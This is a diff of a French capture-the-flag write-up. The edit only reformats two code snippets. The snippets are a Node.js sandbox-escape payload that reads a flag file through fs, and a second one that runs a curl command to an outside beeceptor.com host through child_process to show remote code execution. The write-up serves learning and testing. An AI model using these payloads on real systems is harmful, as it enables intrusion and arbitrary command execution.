@@ -44,13 +44,17 @@ Ce qui compte ici c'est le contexte dans lequel est exécuté notre code. En uti
 
 On peut maintenant utiliser `require` pour appeler n'importe quelle librairie native ! À nous le flag.
 
-`this.constructor.constructor("return process.mainModule.require(\'fs\').readFileSync(\'flag\',\'utf-8\')")()`
+```
+this.constructor.constructor("return process.mainModule.require(\'fs\').readFileSync(\'flag\',\'utf-8\')")()
+```
 
 ![](/images/015/04.png)
 
 Petit bonus, on peut également obtenir une RCE côté système avec le module `child_process`.
 
-`this.constructor.constructor("return process.mainModule.require(\'child_process\').exec(\'curl http://opencycom.free.beeceptor.com\')")()`
+```
+this.constructor.constructor("return process.mainModule.require(\'child_process\').exec(\'curl http://opencycom.free.beeceptor.com\')")()
+```
 
 ![](/images/015/05.png)
 
